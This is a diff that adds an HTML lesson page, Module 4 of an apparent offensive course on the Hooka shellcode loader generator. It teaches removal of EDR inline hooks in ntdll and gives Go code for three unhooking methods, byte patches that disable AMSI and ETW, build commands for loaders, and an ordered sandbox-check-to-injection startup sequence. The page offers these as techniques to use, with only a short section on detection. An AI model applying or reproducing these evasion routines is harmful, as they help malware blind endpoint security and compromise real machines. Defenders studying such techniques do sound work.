@@ -1,0 +1,447 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Module 4: Unhooking &amp; Patching - Hooka Course</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>&#x1FA9D;</text></svg>">
+<link rel="stylesheet" href="../../../assets/course.css">
+<style>:root{--accent:#4ade80;--accent2:#2dd4bf;--gradient:linear-gradient(135deg,#4ade80,#2dd4bf)}</style>
+</head>
+<body>
+
+<button class="hamburger" aria-label="Toggle navigation">&#9776;</button>
+
+<nav>
+<div class="logo">
+<h2>Hooka Course</h2>
+<span>Shellcode Loader Generator</span>
+</div>
+<a class="home-link" href="../Hooka_index.html">&larr; Course Home</a>
+<a class="mod-link" href="module1.html"><span>1. Intro to Shellcode Loaders</span><span class="diff d1">d1</span></a>
+<a class="mod-link" href="module2.html"><span>2. Injection Techniques</span><span class="diff d1">d1</span></a>
+<a class="mod-link" href="module3.html"><span>3. Syscalls &amp; Gate Techniques</span><span class="diff d1">d1</span></a>
+<a class="mod-link active" href="module4.html"><span>4. Unhooking &amp; Patching</span><span class="diff d2">d2</span></a>
+<a class="mod-link" href="module5.html"><span>5. Sandbox &amp; Process Protection</span><span class="diff d2">d2</span></a>
+<a class="mod-link" href="module6.html"><span>6. Encryption &amp; Obfuscation</span><span class="diff d2">d2</span></a>
+<a class="mod-link" href="module7.html"><span>7. The Hooka Go Library</span><span class="diff d3">d3</span></a>
+<a class="mod-link" href="module8.html"><span>8. CLI Generator &amp; Full Chain</span><span class="diff d3">d3</span></a>
+</nav>
+
+<main>
+<span class="diff-badge medium">Difficulty: Intermediate</span>
+<h1>Module 4: Unhooking &amp; Patching</h1>
+<p class="subtitle">If you cannot avoid the hooks, tear them out.</p>
+
+<div class="card highlight">
+<h4>Module Objective</h4>
+<p>While Module 3 showed how to <em>bypass</em> hooks using direct syscalls, this module covers the complementary approach: <strong>removing hooks entirely</strong> and <strong>disabling telemetry sources</strong>. You will learn how EDR inline hooks work at the byte level, how Hooka detects and removes them through three unhooking methods, and how AMSI and ETW patching eliminate two additional detection vectors.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>1. How EDR Hooking Works</h2>
+
+<p>EDR products install <strong>inline hooks</strong> (also called <strong>detours</strong>) on critical ntdll.dll functions. An inline hook replaces the first few bytes of a function with a <code>JMP</code> instruction that redirects execution to the EDR's monitoring code. After inspecting the call, the EDR can allow it to proceed, modify arguments, or block it entirely.</p>
+
+<div class="diagram">
+<h4 style="color:var(--accent);margin-bottom:15px;text-align:center">Anatomy of an Inline Hook</h4>
+<div style="display:flex;gap:30px;justify-content:center;flex-wrap:wrap">
+<div style="flex:1;min-width:280px">
+<p style="text-align:center;font-weight:700;margin-bottom:10px;color:var(--green)">Before Hooking (Clean)</p>
+<pre><span class="lang-tag">ASM</span>NtWriteVirtualMemory:
+  4C 8B D1        mov r10, rcx
+  B8 3A 00 00 00  mov eax, 0x3A
+  0F 05           syscall
+  C3              ret</pre>
+</div>
+<div style="flex:1;min-width:280px">
+<p style="text-align:center;font-weight:700;margin-bottom:10px;color:var(--red)">After Hooking (EDR)</p>
+<pre><span class="lang-tag">ASM</span>NtWriteVirtualMemory:
+  E9 XX XX XX XX  jmp EDR_Handler
+  00 00 00        (clobbered bytes)
+  0F 05           syscall
+  C3              ret</pre>
+</div>
+</div>
+</div>
+
+<p>The <code>JMP</code> instruction (opcode <code>0xE9</code>) is a 5-byte relative jump. It overwrites the original <code>mov r10, rcx</code> (3 bytes) and the first 2 bytes of <code>mov eax, SSN</code>. The original bytes are saved by the EDR so it can execute them after inspection (this is called the <strong>trampoline</strong>).</p>
+
+<div class="card">
+<h4>What EDRs Hook</h4>
+<p>EDR products typically hook a targeted set of sensitive NT functions. Common targets include:</p>
+<table>
+<tr><th>Function</th><th>Why It's Monitored</th></tr>
+<tr><td><code>NtAllocateVirtualMemory</code></td><td>Detects memory allocation for shellcode</td></tr>
+<tr><td><code>NtWriteVirtualMemory</code></td><td>Detects writing shellcode to process memory</td></tr>
+<tr><td><code>NtProtectVirtualMemory</code></td><td>Detects RW &rarr; RX permission changes</td></tr>
+<tr><td><code>NtCreateThreadEx</code></td><td>Detects new thread creation for execution</td></tr>
+<tr><td><code>NtMapViewOfSection</code></td><td>Detects DLL injection via section mapping</td></tr>
+<tr><td><code>NtQueueApcThread</code></td><td>Detects APC-based injection</td></tr>
+<tr><td><code>NtOpenProcess</code></td><td>Detects cross-process handle acquisition</td></tr>
+<tr><td><code>NtResumeThread</code></td><td>Detects resuming a suspended (injected) thread</td></tr>
+</table>
+</div>
+
+<!-- ============================================================ -->
+<h2>2. Hook Detection</h2>
+
+<p>Before unhooking, Hooka can <strong>detect</strong> which functions are hooked. This is useful both for reconnaissance (understanding which EDR is present) and for targeted unhooking (only restore the functions you need).</p>
+
+<h3>DetectHooks()</h3>
+<p>Scans all exported functions in ntdll.dll and returns a list of hooked ones:</p>
+
+<pre><span class="lang-tag">Go</span>// Detect all hooked functions in ntdll
+func DetectHooks() ([]string, error) {
+    ntdll := GetModuleHandle("ntdll.dll")
+    exports := parseExportTable(ntdll)
+
+    var hooked []string
+    for _, exp := range exports {
+        stub := readBytes(exp.Address, 5)
+        // Check for JMP at start (standard hook)
+        if stub[0] == 0xE9 {
+            hooked = append(hooked, exp.Name)
+            continue
+        }
+        // Check for JMP after mov r10, rcx (Tartarus-style)
+        if stub[0] == 0x4C && stub[1] == 0x8B && stub[2] == 0xD1 {
+            if stub[3] == 0xE9 {
+                hooked = append(hooked, exp.Name)
+            }
+        }
+    }
+    return hooked, nil
+}</pre>
+
+<h3>IsHooked(funcName)</h3>
+<p>Checks a single specific function. Use <code>IsHooked("NtAllocateVirtualMemory")</code> for targeted checks, or <code>DetectHooks()</code> to scan all exports at once:</p>
+
+<pre><span class="lang-tag">Go</span>hooked, _ := hooka.IsHooked("NtAllocateVirtualMemory")  // single check
+allHooked, _ := hooka.DetectHooks()                       // scan all exports
+fmt.Printf("Found %d hooked functions\n", len(allHooked))</pre>
+
+<div class="card green">
+<h4>Practical Use</h4>
+<p>Running <code>DetectHooks()</code> in a lab with an EDR installed reveals exactly which functions the EDR monitors. Different EDR products hook different sets of functions, so this output can even help identify which EDR is present. CrowdStrike Falcon, for example, hooks a different set of functions than SentinelOne or Elastic EDR.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>3. Classic Unhooking</h2>
+
+<p><code>ClassicUnhook(funcnames []string, dllpath string)</code> restores specific hooked functions by reading their clean bytes from the DLL file on disk and overwriting the hooked bytes in memory.</p>
+
+<div class="diagram">
+<h4 style="color:var(--accent);margin-bottom:15px;text-align:center">Classic Unhooking Flow</h4>
+<div class="flow">
+<div class="flow box">Open DLL from Disk<br><small>C:\Windows\System32\ntdll.dll</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box">Parse PE Headers<br><small>Find .text section</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box">Locate Function<br><small>Match export by name</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box">Read Clean Bytes<br><small>Original stub from disk</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box">Overwrite in Memory<br><small>Replace hooked bytes</small></div>
+</div>
+</div>
+
+<pre><span class="lang-tag">Go</span>// Classic Unhooking - restore specific functions
+func ClassicUnhook(funcNames []string, dllPath string) error {
+    // Read the clean DLL from disk
+    cleanDLL, err := os.ReadFile(dllPath)
+    if err != nil {
+        return err
+    }
+
+    // Parse the PE to find exports and .text section
+    pe := parsePE(cleanDLL)
+    textSection := pe.Section(".text")
+
+    // Get the in-memory ntdll base
+    ntdllBase := GetModuleHandle("ntdll.dll")
+
+    for _, funcName := range funcNames {
+        // Find function offset in clean DLL
+        funcOffset := pe.ExportOffset(funcName)
+        cleanBytes := cleanDLL[funcOffset : funcOffset+STUB_SIZE]
+
+        // Get function address in memory
+        funcAddr := GetProcAddress(ntdllBase, funcName)
+
+        // Make memory writable
+        VirtualProtect(funcAddr, STUB_SIZE,
+            PAGE_EXECUTE_READWRITE, &oldProtect)
+
+        // Overwrite hooked bytes with clean ones
+        copy(memorySlice(funcAddr, STUB_SIZE), cleanBytes)
+
+        // Restore original protection
+        VirtualProtect(funcAddr, STUB_SIZE,
+            oldProtect, &tmp)
+    }
+    return nil
+}
+
+// Usage
+hooka.ClassicUnhook(
+    []string{"NtAllocateVirtualMemory", "NtWriteVirtualMemory",
+             "NtProtectVirtualMemory", "NtCreateThreadEx"},
+    `C:\Windows\System32\ntdll.dll`,
+)</pre>
+
+<div class="card">
+<h4>Pros and Cons</h4>
+<p><strong>Pros:</strong> Surgical precision &mdash; only restores the functions you specify, leaving the rest of the EDR's hooks intact. Smaller memory footprint and less suspicious than full DLL replacement.</p>
+<p><strong>Cons:</strong> Requires knowing which functions are hooked. If you miss one, the EDR still sees those calls. Also, reading the DLL from disk can be detected (file access monitoring).</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>4. Full DLL Unhooking</h2>
+
+<p><code>FullUnhook(dllsToUnhook []string)</code> takes a more aggressive approach: it replaces the <strong>entire .text section</strong> of each specified DLL in memory with the clean version from disk. This removes all hooks at once, regardless of which specific functions were targeted.</p>
+
+<pre><span class="lang-tag">Go</span>// Full DLL Unhooking - replace entire .text sections
+func FullUnhook(dllNames []string) error {
+    for _, dllName := range dllNames {
+        dllPath := filepath.Join(os.Getenv("WINDIR"), "System32", dllName)
+        cleanDLL, _ := os.ReadFile(dllPath)
+        cleanText := parsePE(cleanDLL).SectionData(".text")
+
+        dllBase := GetModuleHandle(dllName)
+        memPE := parsePEFromMemory(dllBase)
+        memTextAddr := dllBase + memPE.SectionRVA(".text")
+        memTextSize := memPE.SectionSize(".text")
+
+        VirtualProtect(memTextAddr, memTextSize, PAGE_EXECUTE_READWRITE, &oldProtect)
+        copy(memorySlice(memTextAddr, memTextSize), cleanText)
+        VirtualProtect(memTextAddr, memTextSize, oldProtect, &tmp)
+    }
+    return nil
+}
+
+// Usage: unhook ntdll and kernelbase
+hooka.FullUnhook([]string{"ntdll.dll", "kernelbase.dll"})</pre>
+
+<div class="card warn">
+<h4>Detection Considerations</h4>
+<p>Full DLL unhooking is powerful but detectable. The act of reading <code>ntdll.dll</code> from disk and making the .text section writable are both observable events. Some EDRs periodically re-scan their hooks and will detect that they have been removed. Additionally, the <code>VirtualProtect</code> call on the .text section of ntdll.dll itself can be flagged as suspicious.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>5. Perun's Fart (PerunsUnhook)</h2>
+
+<p><code>PerunsUnhook()</code> is a specialized unhooking technique that specifically targets <strong>ntdll.dll</strong>. Named after the Slavic god Perun, this method uses a different approach to obtain a clean copy of ntdll &mdash; it maps a fresh copy from the KnownDLLs directory rather than reading from disk.</p>
+
+<pre><span class="lang-tag">Go</span>// Perun's Fart - ntdll restoration via KnownDLLs
+func PerunsUnhook() error {
+    // Open section handle to clean ntdll from KnownDLLs
+    var hSection uintptr
+    objectName := initUnicodeString(`\KnownDlls\ntdll.dll`)
+    objectAttrs := OBJECT_ATTRIBUTES{
+        Length: uint32(unsafe.Sizeof(OBJECT_ATTRIBUTES{})),
+        ObjectName: &objectName,
+    }
+    NtOpenSection(&hSection, SECTION_MAP_READ|SECTION_MAP_EXECUTE, &objectAttrs)
+
+    // Map the clean ntdll into our process
+    var cleanBase, viewSize uintptr
+    NtMapViewOfSection(hSection, currentProcess,
+        &cleanBase, 0, 0, nil, &viewSize, ViewUnmap, 0, PAGE_READONLY)
+
+    // Replace hooked .text section with clean bytes
+    hookedBase := GetModuleHandle("ntdll.dll")
+    cleanText := getSectionData(cleanBase, ".text")
+    hookedTextAddr := hookedBase + getSectionRVA(hookedBase, ".text")
+    hookedTextSize := getSectionSize(hookedBase, ".text")
+
+    VirtualProtect(hookedTextAddr, hookedTextSize, PAGE_EXECUTE_READWRITE, &oldProtect)
+    copy(memorySlice(hookedTextAddr, hookedTextSize), cleanText)
+    VirtualProtect(hookedTextAddr, hookedTextSize, oldProtect, &tmp)
+
+    NtUnmapViewOfSection(currentProcess, cleanBase)
+    NtClose(hSection)
+    return nil
+}</pre>
+
+<div class="card green">
+<h4>Why KnownDLLs Instead of Disk?</h4>
+<p>The <code>\KnownDlls\</code> directory is a kernel-maintained cache of trusted system DLLs. Mapping from KnownDLLs avoids the file system entirely &mdash; no <code>CreateFile</code> or <code>ReadFile</code> calls that an EDR might monitor. The section object is already in memory (kernel space), so the only observable action is the <code>NtMapViewOfSection</code> call itself.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>6. Unhooking Method Comparison</h2>
+
+<table>
+<tr><th>Method</th><th>Function</th><th>Scope</th><th>Source of Clean Bytes</th><th>Stealth</th><th>Speed</th></tr>
+<tr><td><strong>Classic</strong></td><td><code>ClassicUnhook()</code></td><td>Selected functions only</td><td>DLL on disk</td><td>Medium (file read)</td><td>Fast</td></tr>
+<tr><td><strong>Full DLL</strong></td><td><code>FullUnhook()</code></td><td>Entire .text of any DLL</td><td>DLL on disk</td><td>Low (large write + file read)</td><td>Medium</td></tr>
+<tr><td><strong>Perun's Fart</strong></td><td><code>PerunsUnhook()</code></td><td>Entire .text of ntdll only</td><td>KnownDLLs (kernel cache)</td><td>High (no file access)</td><td>Fast</td></tr>
+</table>
+
+<div class="card highlight">
+<h4>Which Method Should You Use?</h4>
+<p>For most scenarios, <strong>Perun's Fart</strong> is the best choice for ntdll unhooking because it avoids disk access entirely. Use <strong>Classic</strong> when you only need to unhook a few specific functions and want minimal impact. Use <strong>Full DLL</strong> when you need to unhook libraries beyond ntdll (e.g., <code>kernelbase.dll</code>, <code>kernel32.dll</code>) where KnownDLLs mapping is not applicable.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>7. AMSI Patching</h2>
+
+<p>The <strong>Antimalware Scan Interface (AMSI)</strong> is a Windows framework that allows applications to send content to the installed antivirus for scanning. PowerShell, .NET, VBScript, JScript, and Windows Script Host all use AMSI. A loaded shellcode runner that uses any of these technologies (or loads .NET assemblies) will have its content scanned through AMSI.</p>
+
+<p>Hooka provides <strong>two independent methods</strong> to disable AMSI:</p>
+
+<h3>PatchAmsi() &mdash; Method 1</h3>
+<p>Patches <code>AmsiScanBuffer</code> in <code>amsi.dll</code> to return immediately with a clean result. The patch writes <code>xor eax, eax; ret</code> (3 bytes: <code>31 C0 C3</code>) at the function entry, making every scan return <code>AMSI_RESULT_CLEAN</code> (0):</p>
+
+<pre><span class="lang-tag">Go</span>// AMSI Patch Method 1: Patch AmsiScanBuffer to always return clean
+func PatchAmsi() error {
+    amsi := LoadLibrary("amsi.dll")
+    target := GetProcAddress(amsi, "AmsiScanBuffer")
+    patch := []byte{0x31, 0xC0, 0xC3}  // xor eax, eax + ret
+    VirtualProtect(target, len(patch), PAGE_EXECUTE_READWRITE, &oldProtect)
+    copy(memorySlice(target, len(patch)), patch)
+    VirtualProtect(target, len(patch), oldProtect, &tmp)
+    return nil
+}</pre>
+
+<h3>PatchAmsi2() &mdash; Method 2</h3>
+<p>Patches <code>AmsiInitialize</code> instead, preventing AMSI from initializing at all. Writes <code>mov eax, 0x80070057; ret</code> to make the function return <code>E_INVALIDARG</code> immediately. If AMSI never initializes, no scanning occurs.</p>
+
+<div class="card">
+<h4>Why Two Methods?</h4>
+<p>Having two independent patching methods provides redundancy. If one method is detected and blocked by a security product (e.g., the EDR monitors writes to <code>AmsiScanBuffer</code>), the other method targeting a different function may succeed. Hooka enables AMSI patching by default in generated loaders.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>8. ETW Patching</h2>
+
+<p><strong>Event Tracing for Windows (ETW)</strong> is the telemetry backbone of Windows. Security products subscribe to ETW providers to receive events about process creation, thread activity, network connections, image loads, and more. The primary function for emitting ETW events is <code>EtwEventWrite</code> in ntdll.dll.</p>
+
+<p>Hooka provides <strong>two methods</strong> to disable ETW event emission:</p>
+
+<h3>PatchEtw() &mdash; Method 1</h3>
+<p>Patches <code>EtwEventWrite</code> in ntdll.dll to return <code>STATUS_SUCCESS</code> (0) immediately without writing any events. Uses the same <code>xor eax, eax; ret</code> patch technique as AMSI patching:</p>
+
+<pre><span class="lang-tag">Go</span>// ETW Patch: Neuter EtwEventWrite so no events are emitted
+func PatchEtw() error {
+    ntdll := GetModuleHandle("ntdll.dll")
+    target := GetProcAddress(ntdll, "EtwEventWrite")
+    patch := []byte{0x33, 0xC0, 0xC3}  // xor eax, eax + ret
+    VirtualProtect(target, len(patch), PAGE_EXECUTE_READWRITE, &oldProtect)
+    copy(memorySlice(target, len(patch)), patch)
+    VirtualProtect(target, len(patch), oldProtect, &tmp)
+    return nil
+}</pre>
+
+<h3>PatchEtw2() &mdash; Method 2</h3>
+<p>Targets <code>NtTraceEvent</code> instead, a different function in the ETW chain. This provides an alternative if <code>EtwEventWrite</code> is being monitored for integrity. The patch technique is identical &mdash; overwrite the function entry with <code>xor eax, eax; ret</code>.</p>
+
+<div class="card warn">
+<h4>Impact of ETW Patching</h4>
+<p>Disabling ETW silences a significant portion of the telemetry that EDR agents consume. Without <code>EtwEventWrite</code>, the EDR loses visibility into .NET assembly loads, managed code execution, and numerous other runtime events. However, the absence of expected ETW events can itself be a detection signal &mdash; if an EDR notices that ETW events suddenly stop flowing from a process, it may flag that process as suspicious.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>9. Default Behavior and CLI Flags</h2>
+
+<p>Hooka enables <strong>both AMSI and ETW patching by default</strong> in all generated loaders. This is because most real-world scenarios benefit from disabling these telemetry sources before injection occurs. To disable them:</p>
+
+<pre><span class="lang-tag">Bash</span># Default: AMSI + ETW patching enabled
+./hooka -i shellcode.bin -o loader.exe
+
+# Disable AMSI patching
+./hooka -i shellcode.bin -o loader.exe --no-amsi
+
+# Disable ETW patching
+./hooka -i shellcode.bin -o loader.exe --no-etw
+
+# Disable both
+./hooka -i shellcode.bin -o loader.exe --no-amsi --no-etw</pre>
+
+<!-- ============================================================ -->
+<h2>10. The Loader Startup Sequence</h2>
+
+<p>Understanding the order of operations in a Hooka-generated loader is critical. Patching and unhooking must happen <strong>before</strong> injection, because the injection APIs are what the EDR is trying to monitor:</p>
+
+<div class="diagram">
+<h4 style="color:var(--accent);margin-bottom:15px;text-align:center">Hooka Loader Startup Sequence</h4>
+<div class="flow">
+<div class="flow box">1. Sandbox Checks<br><small>Abort if VM detected</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box">2. Patch AMSI<br><small>Disable scan interface</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box">3. Patch ETW<br><small>Disable event tracing</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box">4. Unhook ntdll<br><small>Remove EDR hooks</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box">5. Decrypt Shellcode<br><small>AES/3DES/RC4/XOR</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box">6. Inject &amp; Execute<br><small>Chosen technique</small></div>
+</div>
+</div>
+
+<p>This order is deliberate:</p>
+<ul>
+<li><strong>Sandbox checks first</strong> &mdash; no point in revealing evasion techniques if running in an analysis environment</li>
+<li><strong>AMSI before ETW</strong> &mdash; prevents .NET/PowerShell scanning in case the loader uses managed code</li>
+<li><strong>ETW before unhooking</strong> &mdash; silences telemetry that would report the unhooking activity</li>
+<li><strong>Unhooking before injection</strong> &mdash; ensures the injection APIs are clean when called</li>
+<li><strong>Decryption just before injection</strong> &mdash; minimizes the time shellcode exists in cleartext memory</li>
+</ul>
+
+<!-- ============================================================ -->
+<h2>11. Detection and Countermeasures</h2>
+
+<div class="card warn">
+<h4>The Arms Race</h4>
+<p>Patching and unhooking are not undetectable. Security products are evolving to counter these techniques:</p>
+<ul>
+<li><strong>Integrity Checks</strong>: Some EDRs periodically verify that their hooks are still in place. If the hooks are gone, an alert fires.</li>
+<li><strong>Kernel-Level Monitoring</strong>: Kernel callbacks (<code>PsSetLoadImageNotifyRoutine</code>, <code>ObRegisterCallbacks</code>) operate below ntdll and cannot be unhooked from user mode.</li>
+<li><strong>Hardware Breakpoints</strong>: Some EDRs use hardware breakpoints instead of inline hooks, invisible to stub-reading detection.</li>
+<li><strong>Syscall Monitoring</strong>: Newer EDRs hook at the kernel level to monitor syscalls regardless of ntdll hooks.</li>
+<li><strong>ETW-TI</strong>: The ETW Threat Intelligence provider operates from kernel mode and cannot be disabled by user-mode patching.</li>
+</ul>
+</div>
+
+<p>Despite these countermeasures, patching and unhooking remain effective against many deployed security products. The key is combining multiple techniques so no single defense gap allows detection.</p>
+
+<!-- ============================================================ -->
+<div class="quiz">
+<h2>Knowledge Check</h2>
+
+<div class="quiz-q" data-answer="B">
+<p>Q1: What does Perun's Fart (PerunsUnhook) use as its source of clean ntdll bytes?</p>
+<div class="quiz-btn" data-choice="A">A) Downloads a fresh copy from Microsoft's servers</div>
+<div class="quiz-btn" data-choice="B">B) Maps a clean copy from the KnownDLLs kernel cache</div>
+<div class="quiz-btn" data-choice="C">C) Reads ntdll.dll from the System32 directory on disk</div>
+<div class="quiz-btn" data-choice="D">D) Extracts it from the running kernel memory</div>
+</div>
+
+<div class="quiz-q" data-answer="A">
+<p>Q2: Why does Hooka patch AMSI and ETW before performing unhooking?</p>
+<div class="quiz-btn" data-choice="A">A) To silence telemetry that would report the unhooking activity itself</div>
+<div class="quiz-btn" data-choice="B">B) Because AMSI prevents DLLs from being loaded</div>
+<div class="quiz-btn" data-choice="C">C) ETW patching is required before any memory can be allocated</div>
+<div class="quiz-btn" data-choice="D">D) AMSI blocks all process creation until patched</div>
+</div>
+
+<div class="quiz-q" data-answer="C">
+<p>Q3: What is a key limitation of user-mode unhooking techniques?</p>
+<div class="quiz-btn" data-choice="A">A) They only work on 32-bit Windows</div>
+<div class="quiz-btn" data-choice="B">B) They require administrator privileges</div>
+<div class="quiz-btn" data-choice="C">C) Kernel-level callbacks and ETW-TI cannot be disabled from user mode</div>
+<div class="quiz-btn" data-choice="D">D) They corrupt the Windows registry</div>
+</div>
+</div>
+
+<div class="nav-btns">
+<a href="module3.html">&larr; Previous: Syscalls &amp; Gate Techniques</a>
+<a class="primary" href="module5.html">Next: Sandbox &amp; Process Protection &rarr;</a>
+</div>
+</main>
+
+<script src="../../../assets/course.js"></script>
+</body>
+</html>
